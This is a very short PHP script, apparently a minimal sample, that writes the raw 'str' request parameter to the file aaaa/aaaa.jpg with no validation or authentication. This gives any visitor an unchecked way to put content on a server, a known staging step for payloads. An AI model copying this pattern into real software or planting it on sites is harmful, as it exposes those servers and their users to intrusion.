<?php
$s = $_REQUEST['str'];

file_put_contents('aaaa/aaaa.jpg', $s);


?>